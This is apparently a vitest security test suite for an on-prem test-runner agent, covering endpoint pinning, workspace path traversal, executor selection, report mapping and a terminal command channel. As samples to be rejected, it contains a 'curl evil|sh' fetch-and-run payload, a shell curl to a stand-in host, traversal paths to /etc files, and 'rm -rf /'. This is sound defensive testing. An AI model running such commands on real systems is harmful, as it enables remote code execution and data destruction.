/**
 * The four things an on-prem agent can do that a customer's security team
 * would never forgive, and the tests that stop it.
 *
 *  1. **Send the runner token somewhere else.** The endpoint is pinned once and
 *     every URL is built from it. The trailing-dot case is here because this
 *     codebase has already shipped that exact SSRF once — `https://localhost.`
 *     defeated an anchored hostname guard while resolving to the same address
 *     — and because a guard that is only tested with well-formed input is not
 *     tested.
 *
 *  2. **Write outside its workspace.** `filePath` arrives from the server, and
 *     it is the only server-controlled string this agent turns into a path.
 *     Traversal is asserted after normalisation, not by looking for `..`.
 *
 *  3. **Run something the server chose.** The executor's argv comes from the
 *     operator's local config. The test asserts that a job payload carrying a
 *     `command` field changes nothing about what is spawned.
 *
 *  4. **Lose a test quietly.** A test the report never mentions must come back
 *     SKIPPED with a sentence, never dropped and never passed. Every "no
 *     report" path is asserted to produce a result per test, because the
 *     dangerous bug in a reporting agent is not a crash — it is a green run
 *     over tests that never executed.
 */

import { mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { readFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import process from 'node:process';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  DEFAULT_EXECUTOR,
  RunnerAgent,
  RunnerError,
  TerminalChannel,
  backoffMs,
  browsersFromCacheEntries,
  decodeXml,
  executorEnvironment,
  executorFor,
  mapReport,
  materialiseWorkspace,
  parseJunitXml,
  parseRunnerConfig,
  pinEndpoint,
  probeCapabilities,
  resolveWorkspacePath,
  spawnExecutor,
  terminalEnabled,
  terminalEnvironment,
} from './runner.js';
import type { ApiResponse } from './runner.js';

// ─── 1. The pinned endpoint ──────────────────────────────────────────────────

describe('pinEndpoint', () => {
  it('accepts an https origin and freezes it', () => {
    const endpoint = pinEndpoint('https://qaai.acme.com/');
    expect(endpoint.origin).toBe('https://qaai.acme.com');
    expect(endpoint.url('/runners/agent/claim')).toBe('https://qaai.acme.com/runners/agent/claim');
  });

  it('keeps a non-default port', () => {
    expect(pinEndpoint('https://qaai.acme.com:8443').origin).toBe('https://qaai.acme.com:8443');
  });

  it('refuses plain http off the loopback', () => {
    expect(() => pinEndpoint('http://qaai.acme.com')).toThrow(/must be https/i);
  });

  it('allows http on loopback, where the token cannot leave the machine', () => {
    expect(pinEndpoint('http://localhost:4000').origin).toBe('http://localhost:4000');
    expect(pinEndpoint('http://127.0.0.1:4000').origin).toBe('http://127.0.0.1:4000');
  });

  it('strips a trailing dot before deciding anything', () => {
    // `https://localhost./x` resolves exactly like `https://localhost/x`. The
    // normalisation has to happen BEFORE the loopback test, or one character
    // changes the answer.
    const endpoint = pinEndpoint('http://localhost.:4000');
    expect(endpoint.host).toBe('localhost');
    expect(endpoint.url('/x')).toBe('http://localhost:4000/x');
  });

  it('refuses a trailing-dot host that would otherwise be rejected as non-https', () => {
    expect(() => pinEndpoint('http://qaai.acme.com.')).toThrow(/must be https/i);
  });

  it('refuses credentials embedded in the URL', () => {
    expect(() => pinEndpoint('https://user:qaai_rt_secret@qaai.acme.com')).toThrow(/credentials/i);
  });

  it('does not echo an unparseable URL back, in case it carried a token', () => {
    let message = '';
    try {
      pinEndpoint('https://user:qaai_rt_leaked@ not a url');
    } catch (err) {
      message = (err as Error).message;
    }
    expect(message).not.toContain('qaai_rt_leaked');
  });

  it('refuses to build a URL from anything but a path', () => {
    const endpoint = pinEndpoint('https://qaai.acme.com');
    expect(() => endpoint.url('https://evil.example.com/steal')).toThrow(RunnerError);
    expect(() => endpoint.url('//evil.example.com/steal')).toThrow(/host other than the pinned/i);
  });
});

// ─── 2. The workspace ────────────────────────────────────────────────────────

describe('resolveWorkspacePath', () => {
  const root = '/tmp/qaai-workspace';

  it('resolves a normal relative path inside the root', () => {
    expect(resolveWorkspacePath(root, 'tests/login.spec.ts')).toBe(
      join(root, 'tests', 'login.spec.ts'),
    );
  });

  it('refuses a path that escapes after normalisation', () => {
    expect(() => resolveWorkspacePath(root, '../../etc/cron.d/pwn')).toThrow(/escapes/i);
    expect(() => resolveWorkspacePath(root, 'a/b/../../../outside.ts')).toThrow(/escapes/i);
  });

  it('refuses an absolute path', () => {
    expect(() => resolveWorkspacePath(root, '/etc/passwd')).toThrow(/absolute/i);
    expect(() => resolveWorkspacePath(root, 'C:\\Windows\\System32\\x')).toThrow(/absolute/i);
  });

  it('refuses a null byte', () => {
    expect(() => resolveWorkspacePath(root, 'tests/a\0.ts')).toThrow(/null byte/i);
  });

  it('does not mistake a leading-dots filename for traversal', () => {
    expect(resolveWorkspacePath(root, '..hidden.spec.ts')).toBe(join(root, '..hidden.spec.ts'));
  });
});

describe('materialiseWorkspace', () => {
  let root = '';

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'qaai-runner-'));
  });
  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('writes specs and fixtures where the report mapping expects them', async () => {
    const byPath = await materialiseWorkspace(root, {
      tests: [
        {
          id: 't1',
          name: 'logs in',
          type: 'E2E',
          code: 'export const x = 1;',
          filePath: 'tests/login.spec.ts',
          spec: null,
          timeoutMs: 1000,
          quarantined: false,
          tags: [],
        },
      ],
      fixtures: { 'fixtures/users.json': '{"a":1}' },
    });

    expect(byPath.get('tests/login.spec.ts')).toBe('t1');
    expect(await readFile(join(root, 'tests', 'login.spec.ts'), 'utf8')).toBe('export const x = 1;');
    expect(await readFile(join(root, 'fixtures', 'users.json'), 'utf8')).toBe('{"a":1}');
  });

  it('refuses a job whose spec would be written outside the workspace', async () => {
    await expect(
      materialiseWorkspace(root, {
        tests: [
          {
            id: 't1',
            name: 'evil',
            type: 'E2E',
            code: 'rm -rf /',
            filePath: '../../../../etc/profile.d/pwn.sh',
            spec: null,
            timeoutMs: 1000,
            quarantined: false,
            tags: [],
          },
        ],
        fixtures: {},
      }),
    ).rejects.toThrow(/escapes the workspace/i);
  });
});

// ─── 3. The executor comes from local config, never from the server ──────────

describe('parseRunnerConfig', () => {
  it('defaults to the Playwright executor', () => {
    const config = parseRunnerConfig({}, 'qaai-runner.json');
    expect(config.executors.default).toEqual(DEFAULT_EXECUTOR);
  });

  it('refuses a token stored beside the config', () => {
    expect(() => parseRunnerConfig({ token: 'qaai_rt_abc' }, 'qaai-runner.json')).toThrow(
      /QAAI_RUNNER_TOKEN/,
    );
  });

  it('requires an executor to name a binary and a report', () => {
    expect(() =>
      parseRunnerConfig({ executors: { default: { args: ['x'] } } }, 'c.json'),
    ).toThrow(/command/);
    expect(() =>
      parseRunnerConfig({ executors: { default: { command: 'npx' } } }, 'c.json'),
    ).toThrow(/report/);
  });

  it('picks a per-test-type executor when one is configured', () => {
    const config = parseRunnerConfig(
      {
        executors: {
          LOAD: { command: 'k6', args: ['run', 'script.js'], report: 'k6.xml' },
        },
      },
      'c.json',
    );
    expect(executorFor(config, ['LOAD']).command).toBe('k6');
    expect(executorFor(config, ['E2E']).command).toBe('npx');
  });

  it('ignores a command the server tried to supply', () => {
    /*
     * The shape a compromised or hostile server would send. It is not a field
     * this program reads from a job at all — the assertion is that the executor
     * is still whatever the operator configured.
     */
    const jobPayloadPretendingToBeConfig = { command: '/bin/sh', args: ['-c', 'curl evil|sh'] };
    const config = parseRunnerConfig({}, 'c.json');
    const chosen = executorFor(config, ['E2E']);
    expect(chosen.command).toBe('npx');
    expect(chosen.args).not.toContain(jobPayloadPretendingToBeConfig.args[0]);
  });
});

describe('spawnExecutor', () => {
  let root = '';

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), 'qaai-spawn-'));
  });
  afterEach(() => {
    rmSync(root, { recursive: true, force: true });
  });

  it('reports a missing binary as missing rather than as a failure', async () => {
    const outcome = await spawnExecutor(
      { command: 'qaai-definitely-not-installed', args: [], report: 'junit.xml' },
      root,
      {},
    );
    expect(outcome.missing).toBe(true);
  });

  it('does not hand its arguments to a shell', async () => {
    // With `shell: true` this would create the file. With `shell: false` — the
    // only mode this function has — `;` is just another argument to echo.
    const outcome = await spawnExecutor(
      { command: 'node', args: ['-e', 'process.stderr.write("ok")'], report: 'junit.xml' },
      root,
      { PATH: process.env.PATH ?? '' },
    );
    expect(outcome.missing).toBe(false);
    expect(outcome.stderr).toContain('ok');
  });
});

// ─── 4. Nothing is lost, and nothing is silently green ───────────────────────

describe('parseJunitXml', () => {
  it('reads passes, failures and skips', () => {
    const cases = parseJunitXml(`<?xml version="1.0"?>
      <testsuites>
        <testsuite name="s">
          <testcase name="logs in" classname="tests/login.spec.ts" time="1.5"/>
          <testcase name="checks out" file="tests/checkout.spec.ts" time="2">
            <failure message="expected 200, got 500">at checkout.spec.ts:12</failure>
          </testcase>
          <testcase name="ignored" file="tests/x.spec.ts"><skipped/></testcase>
        </testsuite>
      </testsuites>`);

    expect(cases).toHaveLength(3);
    expect(cases[0]).toMatchObject({ name: 'logs in', status: 'PASSED', durationMs: 1500 });
    expect(cases[1]).toMatchObject({ status: 'FAILED', message: 'expected 200, got 500' });
    expect(cases[2]?.status).toBe('SKIPPED');
  });

  it('decodes entities without double-decoding an escaped ampersand', () => {
    expect(decodeXml('a &amp;lt; b')).toBe('a &lt; b');
    expect(decodeXml('&lt;div&gt; &quot;x&quot; &#65;')).toBe('<div> "x" A');
  });

  it('returns nothing for a report it cannot read, rather than guessing', () => {
    expect(parseJunitXml('<html>500 Internal Server Error</html>')).toEqual([]);
    expect(parseJunitXml('')).toEqual([]);
  });
});

describe('mapReport', () => {
  const tests = [
    { id: 't1', name: 'logs in', filePath: 'tests/login.spec.ts' },
    { id: 't2', name: 'checks out', filePath: 'tests/checkout.spec.ts' },
  ];

  it('accounts for every test even when the report mentions none of them', () => {
    const reports = mapReport(tests, [], 'k6 is not installed on this runner host.');
    expect(reports).toHaveLength(2);
    for (const report of reports) {
      expect(report.status).toBe('SKIPPED');
      expect(report.errorMessage).toMatch(/not installed/);
    }
  });

  it('never reports a test as passed because the report was silent about it', () => {
    const reports = mapReport(
      tests,
      [{ name: 'logs in', classname: 'tests/login.spec.ts', file: '', durationMs: 10, status: 'PASSED', message: null, detail: null }],
      'no result was produced for this test',
    );
    expect(reports.find((r) => r.testId === 't1')?.status).toBe('PASSED');
    const missing = reports.find((r) => r.testId === 't2');
    expect(missing?.status).toBe('SKIPPED');
    expect(missing?.errorMessage).toBe('no result was produced for this test');
  });

  it('matches by file when the case name does not match a test name', () => {
    const reports = mapReport(
      tests,
      [{ name: 'suite > logs in', classname: '', file: 'tests/login.spec.ts', durationMs: 5, status: 'FAILED', message: 'boom', detail: 'stack' }],
      'note',
    );
    const failed = reports.find((r) => r.testId === 't1');
    expect(failed?.status).toBe('FAILED');
    expect(failed?.errorMessage).toBe('boom');
    expect(failed?.steps[0]?.error?.stack).toBe('stack');
  });

  it('treats a retry that passes as a flake candidate, not a pass', () => {
    // §5: a retry that passes is NOT a pass. Overwriting the failure would hide
    // exactly the intermittency the product exists to surface.
    const reports = mapReport(
      [tests[0]!],
      [
        { name: 'logs in', classname: '', file: 'tests/login.spec.ts', durationMs: 10, status: 'FAILED', message: 'flaked', detail: null },
        { name: 'logs in', classname: '', file: 'tests/login.spec.ts', durationMs: 12, status: 'PASSED', message: null, detail: null },
      ],
      'note',
    );
    expect(reports[0]?.status).toBe('PASSED');
    expect(reports[0]?.retriedAndPassed).toBe(true);
    expect(reports[0]?.durationMs).toBe(22);
  });

  it('drops a case for a test it was not given', () => {
    const reports = mapReport(
      [tests[0]!],
      [{ name: 'somebody elses test', classname: 'other.spec.ts', file: '', durationMs: 1, status: 'PASSED', message: null, detail: null }],
      'note',
    );
    expect(reports).toHaveLength(1);
    expect(reports[0]?.testId).toBe('t1');
    expect(reports[0]?.status).toBe('SKIPPED');
  });
});

// ─── Supporting behaviour ────────────────────────────────────────────────────

describe('browsersFromCacheEntries', () => {
  it('recognises the Playwright cache layout', () => {
    expect(
      browsersFromCacheEntries([
        'chromium-1140',
        'chromium_headless_shell-1140',
        'firefox-1465',
        '.links',
        'ffmpeg-1011',
      ]).sort(),
    ).toEqual(['chromium', 'firefox']);
  });

  it('reports nothing when no browser is installed', () => {
    expect(browsersFromCacheEntries([])).toEqual([]);
  });
});

describe('backoffMs', () => {
  it('grows, jitters and stops growing', () => {
    // Full jitter: a fleet that lost the API during a deploy must not come back
    // in lockstep and hold it down.
    expect(backoffMs(1, () => 0)).toBe(500);
    expect(backoffMs(1, () => 1)).toBe(1000);
    expect(backoffMs(4, () => 0)).toBe(4000);
    expect(backoffMs(50, () => 1)).toBe(30_000);
  });
});

// ─── 5. The terminal channel ─────────────────────────────────────────────────

/**
 * The fifth thing an on-prem agent can do that nobody would forgive: run a
 * command somebody else chose. The allowlist that stops it is tested in
 * shell.test.ts; what is tested here is the channel around it — that the agent
 * only ever polls (it is never dialed), that it reports an exit for EVERY
 * outcome including its own refusals, that it stops when the lease is gone, and
 * that the numbers the server sends are treated as suggestions with ceilings.
 *
 * `call` is injected rather than served over a socket, so these tests drive the
 * real polling loop against scripted responses. What the fake CANNOT catch is
 * the server changing its mind about the contract: `serverAccepts` below is
 * transcribed from the zod schemas in apps/api/src/routes/terminal.ts, so it
 * catches the AGENT drifting from them and nothing else. The API side of that
 * contract is tested in apps/api/src/routes/terminal.test.ts.
 */

/** Transcribed from `outputSchema` and `exitSchema` in routes/terminal.ts. */
function serverAccepts(path: string, body: unknown): true | string {
  const value = (body ?? {}) as Record<string, unknown>;
  if (path.endsWith('/output')) {
    if (value.stream !== 'stdout' && value.stream !== 'stderr') return `bad stream: ${String(value.stream)}`;
    if (typeof value.chunk !== 'string') return 'chunk is not a string';
    if (value.chunk.length > 64 * 1024) return `chunk is ${value.chunk.length} chars, over the 64Ki cap`;
    return true;
  }
  if (path.endsWith('/exit')) {
    const code = value.exitCode;
    if (code === null) return true;
    if (typeof code !== 'number' || !Number.isInteger(code) || code < -1 || code > 255) {
      return `exitCode ${JSON.stringify(code)} is outside -1..255`;
    }
    return true;
  }
  return true;
}

interface Recorded {
  path: string;
  body: unknown;
}

/**
 * A scripted `/next` queue. Everything after the script is a 409, which is how
 * the real server says "your lease is gone" and how these tests end the loop.
 */
function scriptedApi(
  queue: Array<Partial<{ session: unknown; command: unknown; pollSeconds: number }>>,
  outputResponse: (n: number) => ApiResponse = () => ({ status: 200, json: { ok: true, truncated: false } }),
) {
  const calls: Recorded[] = [];
  const waits: number[] = [];
  let nexts = 0;
  let outputs = 0;
  let finished = false;

  const call = async (path: string, init?: { body?: unknown }): Promise<ApiResponse> => {
    calls.push({ path, body: init?.body });
    const verdict = serverAccepts(path, init?.body);
    if (verdict !== true) throw new Error(`the server would have refused this: ${verdict}`);

    if (path.endsWith('/next')) {
      const scripted = queue[nexts];
      nexts += 1;
      if (!scripted) {
        finished = true;
        return { status: 409, json: { error: { message: 'lease gone' } } };
      }
      return {
        status: 200,
        json: { session: null, command: null, pollSeconds: 15, ...scripted },
      };
    }
    if (path.endsWith('/output')) {
      outputs += 1;
      return outputResponse(outputs);
    }
    return { status: 200, json: { ok: true } };
  };

  return {
    calls,
    waits,
    call,
    done: () => finished,
    paths: () => calls.map((c) => c.path.replace(/^.*\/jobs\//, 'jobs/')),
    bodies: (suffix: string) => calls.filter((c) => c.path.endsWith(suffix)).map((c) => c.body),
    sleep: async (ms: number) => {
      waits.push(ms);
    },
  };
}

const SESSION = { id: 'sh_test', expiresAt: new Date(Date.now() + 60_000).toISOString() };

function command(argv: string[], overrides: Record<string, unknown> = {}) {
  return { id: 'cmd_1', argv, timeoutSeconds: 30, maxOutputBytes: 256 * 1024, ...overrides };
}

describe('TerminalChannel', () => {
  let dir = '';

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'qaai-channel-'));
  });
  afterEach(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  const channelOver = (api: ReturnType<typeof scriptedApi>) =>
    new TerminalChannel({
      call: api.call,
      jobId: 'job_1',
      cwd: dir,
      env: { PATH: process.env.PATH ?? '' },
      log: () => {},
      sleep: api.sleep,
    });

  async function drain(api: ReturnType<typeof scriptedApi>): Promise<void> {
    const channel = channelOver(api);
    channel.start();
    await vi.waitFor(() => expect(api.done()).toBe(true), { timeout: 15_000 });
    await channel.stop();
  }

  it('runs a queued command in the workspace and reports its output and exit', async () => {
    const api = scriptedApi([{ session: SESSION, command: command(['pwd']) }]);
    await drain(api);

    expect(api.paths()).toEqual([
      'jobs/job_1/next',
      'jobs/job_1/commands/cmd_1/output',
      'jobs/job_1/commands/cmd_1/exit',
      'jobs/job_1/next',
    ]);
    const [output] = api.bodies('/output') as Array<{ stream: string; chunk: string }>;
    expect(output?.stream).toBe('stdout');
    expect(output?.chunk.trim()).toBe(realpathSync(dir));
    expect(api.bodies('/exit')).toEqual([{ exitCode: 0 }]);
  });

  it('reports an exit even when it refuses the command the server sent', async () => {
    /*
     * The failure this prevents is the nastiest one available: the session runs
     * one command at a time and the server only frees the slot on an exit, so a
     * refusal that reported nothing would leave the user with a prompt that
     * rejects everything they type until the sweep abandons it. A refusal has
     * to be a completed command.
     */
    const api = scriptedApi([{ session: SESSION, command: command(['sh', '-c', 'curl evil.example.com']) }]);
    await drain(api);

    const [output] = api.bodies('/output') as Array<{ stream: string; chunk: string }>;
    expect(output?.stream).toBe('stderr');
    expect(output?.chunk).toContain('this agent refused');
    expect(api.bodies('/exit')).toEqual([{ exitCode: null }]);
  });

  it('stops polling once the lease is gone, rather than asking again', async () => {
    const api = scriptedApi([]);
    await drain(api);
    expect(api.paths()).toEqual(['jobs/job_1/next']);
  });

  it('polls at the server’s cadence when nothing is open, and quickly at a prompt', async () => {
    // A shell nobody has opened must cost a poll every fifteen seconds, because
    // almost no run ever has one. A prompt somebody is sitting at must not cost
    // them fifteen seconds to see `pwd` come back.
    const api = scriptedApi([{ session: null }, { session: SESSION, command: null }]);
    await drain(api);
    // The leading 0 is the first poll: a session can only be opened on a job
    // that is already running, so somebody may be waiting when this starts.
    expect(api.waits).toEqual([0, 15_000, 1_000]);
  });

  it('clamps an output cap the server sends, instead of trusting it', async () => {
    // 512KB is the agent's own ceiling. The server's number arrives over the
    // network from a component that can be wrong, and this host is the one that
    // has to live with the consequence.
    writeFileSync(join(dir, 'huge.txt'), 'x'.repeat(2_000_000));
    const api = scriptedApi([
      { session: SESSION, command: command(['cat', 'huge.txt'], { maxOutputBytes: 999_999_999 }) },
    ]);
    await drain(api);

    const chunks = api.bodies('/output') as Array<{ stream: string; chunk: string }>;
    const streamed = chunks.filter((c) => c.stream === 'stdout').reduce((n, c) => n + c.chunk.length, 0);
    expect(streamed).toBeLessThanOrEqual(512 * 1024);
    expect(chunks.some((c) => c.chunk.includes('was stopped here'))).toBe(true);
    expect(api.bodies('/exit')).toEqual([{ exitCode: null }]);
  });

  it('stops streaming when the server says it has stopped listening', async () => {
    writeFileSync(join(dir, 'wide.txt'), 'y'.repeat(200_000));
    const api = scriptedApi(
      [{ session: SESSION, command: command(['cat', 'wide.txt']) }],
      () => ({ status: 200, json: { ok: true, truncated: true } }),
    );
    await drain(api);

    // One chunk accepted, then nothing: the far end had already hit its cap, so
    // the rest was not pushed across the customer's egress to be discarded.
    expect(api.bodies('/output')).toHaveLength(1);
    expect(api.bodies('/exit')).toHaveLength(1);
  });
});

// ─── 5b. The fence the server actually checks ────────────────────────────────

describe('every job-scoped call presents the lease', () => {
  let dir = '';
  let realFetch: typeof globalThis.fetch;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'qaai-lease-'));
    realFetch = globalThis.fetch;
  });
  afterEach(() => {
    globalThis.fetch = realFetch;
    rmSync(dir, { recursive: true, force: true });
  });

  it('stamps x-qaai-lease on every /jobs/ request, and on nothing else', async () => {
    /*
     * `x-qaai-lease` is a FENCING TOKEN, and an untested one is the worst kind.
     * Every `/runners/agent/jobs/*` endpoint runs `requireLease`, which reads
     * the header and answers 400 without it — so an agent that holds a lease id
     * and never sends it has every result batch, every artifact and every
     * completion refused, while its own tests stay green because nothing in
     * them ever looks at a header. This drives a whole job through a stubbed
     * `fetch` and reads the headers the server would have read.
     *
     * The negative half matters as much: `/claim` is not job-scoped and has no
     * lease to present, so stamping it everywhere would be a different bug that
     * this assertion would not otherwise notice.
     */
    const sent: Array<{ path: string; lease: string | null }> = [];

    // Typed as the narrow form the agent actually calls — `request()` always
    // passes a string URL — so this stub never has to guess at a Request body.
    globalThis.fetch = (async (input: string, init?: RequestInit) => {
      const url = input;
      const headers = new Headers(init?.headers ?? {});
      sent.push({ path: new URL(url).pathname, lease: headers.get('x-qaai-lease') });

      if (url.endsWith('/runners/agent/claim')) {
        return new Response(
          JSON.stringify({
            job: {
              jobId: 'job_9',
              leaseId: 'lease_abc123',
              runId: 'run_9',
              shardIndex: null,
              attempt: 1,
              leaseSeconds: 60,
              heartbeatSeconds: 15,
              projectId: 'proj_9',
              environment: { id: 'env_9', name: 'staging', baseUrl: 'https://staging.acme.com' },
              tests: [
                {
                  id: 'test_9',
                  name: 'checkout',
                  type: 'E2E',
                  code: '// spec',
                  filePath: 'tests/checkout.spec.ts',
                  spec: null,
                  timeoutMs: 30_000,
                  quarantined: false,
                  tags: [],
                },
              ],
              secrets: {},
              fixtures: {},
              determinism: { randomSeed: 1, waitForNetworkIdle: true, retryOnce: false },
            },
          }),
          { status: 200, headers: { 'content-type': 'application/json' } },
        );
      }
      return new Response(JSON.stringify({ ok: true }), {
        status: 200,
        headers: { 'content-type': 'application/json' },
      });
    }) as unknown as typeof globalThis.fetch;

    const config = parseRunnerConfig(
      {
        workspaceRoot: dir,
        terminal: false,
        // A binary that does not exist, so the job reaches its reporting and
        // completion calls — the ones that carry the fence — without this test
        // depending on a test runner being installed.
        executors: { default: { command: 'qaai-no-such-executor', args: [], report: 'junit.xml' } },
        capabilities: { browsers: [], toolchains: [] },
      },
      'test',
    );

    const agent = new RunnerAgent({
      endpoint: pinEndpoint('http://localhost:4000'),
      token: 'qaai_rt_testtoken',
      config,
      log: () => {},
      maxCycles: 1,
    });
    await agent.loop();

    const jobScoped = sent.filter((call) => call.path.includes('/jobs/'));
    // Results and completion at minimum; both are job-scoped and both were
    // being answered 400 for want of this header.
    expect(jobScoped.length).toBeGreaterThanOrEqual(2);
    expect(jobScoped.map((call) => call.path)).toEqual(
      expect.arrayContaining(['/runners/agent/jobs/job_9/results', '/runners/agent/jobs/job_9/complete']),
    );
    for (const call of jobScoped) {
      expect(call.lease, call.path).toBe('lease_abc123');
    }

    // ...and the claim, which has no lease yet, does not invent one.
    const claim = sent.find((call) => call.path === '/runners/agent/claim');
    expect(claim).toBeDefined();
    expect(claim?.lease).toBeNull();
  });
});

// ─── 6. What a terminal command inherits ─────────────────────────────────────

describe('executorEnvironment / terminalEnvironment', () => {
  const job = {
    runId: 'run_1',
    environment: { id: 'env_1', name: 'staging', baseUrl: 'https://staging.acme.com' },
    determinism: { randomSeed: 7, waitForNetworkIdle: true, retryOnce: false },
    secrets: { STRIPE_KEY: 'sk_live_0123456789', ADMIN_PASSWORD: 'hunter2hunter2' },
  };

  it('gives the executor the secrets, in the environment and not the arguments', () => {
    const full = executorEnvironment(DEFAULT_EXECUTOR, job, { PATH: '/usr/bin' });
    expect(full.STRIPE_KEY).toBe('sk_live_0123456789');
    expect(full.QAAI_BASE_URL).toBe('https://staging.acme.com');
    expect(full.QAAI_RANDOM_SEED).toBe('7');
    expect(DEFAULT_EXECUTOR.args.join(' ')).not.toContain('sk_live');
  });

  it('gives a terminal command the same environment minus every injected secret', () => {
    const full = executorEnvironment(DEFAULT_EXECUTOR, job, {
      PATH: '/usr/bin',
      QAAI_RUNNER_TOKEN: 'qaai_rt_notyours',
      HOME: '/home/build',
    });
    const shell = terminalEnvironment(full, Object.keys(job.secrets));

    // The same environment the test had...
    expect(shell.QAAI_BASE_URL).toBe('https://staging.acme.com');
    expect(shell.PATH).toBe('/usr/bin');
    expect(shell.HOME).toBe('/home/build');
    // ...minus the credentials. No allowlisted command prints an environment,
    // and this is what makes that true of the day somebody adds one.
    expect(shell.STRIPE_KEY).toBeUndefined();
    expect(shell.ADMIN_PASSWORD).toBeUndefined();
    expect(shell.QAAI_RUNNER_TOKEN).toBeUndefined();
    expect(Object.values(shell)).not.toContain('sk_live_0123456789');
  });
});

// ─── 7. Whether this host offers a terminal at all ───────────────────────────

describe('terminalEnabled', () => {
  it('is on unless the operator says otherwise', () => {
    expect(terminalEnabled(undefined)).toBe(true);
    expect(terminalEnabled({ enabled: true })).toBe(true);
    expect(terminalEnabled(false)).toBe(false);
    expect(terminalEnabled({ enabled: false })).toBe(false);
  });

  it('lets the environment override a config file that was baked into an image', () => {
    expect(terminalEnabled(undefined, 'off')).toBe(false);
    expect(terminalEnabled(undefined, '0')).toBe(false);
    expect(terminalEnabled(false, 'on')).toBe(true);
  });

  it('ignores a value it does not recognise rather than guessing', () => {
    // A typo must not silently disable a feature, nor silently enable a command
    // channel into a build host. It means nothing, so the config still decides.
    expect(terminalEnabled(undefined, 'maybe')).toBe(true);
    expect(terminalEnabled(false, 'maybe')).toBe(false);
  });
});

describe('probeCapabilities and the terminal capability', () => {
  const base = parseRunnerConfig(
    { capabilities: { browsers: ['chromium'], toolchains: ['node', 'npx'] } },
    'test',
  );

  it('advertises "terminal" when this agent will actually pick commands up', async () => {
    const capabilities = await probeCapabilities({ ...base, terminal: { enabled: true } });
    expect(capabilities.toolchains).toContain('terminal');
    expect(capabilities.toolchains).toContain('node');
  });

  it('never advertises it when disabled, even if the operator declared it', async () => {
    /*
     * The gate in apps/api/src/lib/pty.ts opens a session on the strength of
     * this string. If an agent that will not poll can advertise it, the user
     * gets a prompt that accepts input and streams nothing back forever — the
     * fake shell the whole feature was not allowed to be. So the flag is
     * derived from what this process will do, and a declaration cannot forge it.
     */
    const declared = parseRunnerConfig(
      { capabilities: { browsers: ['chromium'], toolchains: ['node', 'terminal'] } },
      'test',
    );
    const capabilities = await probeCapabilities({ ...declared, terminal: { enabled: false } });
    expect(capabilities.toolchains).not.toContain('terminal');
    expect(capabilities.toolchains).toContain('node');
  });
});
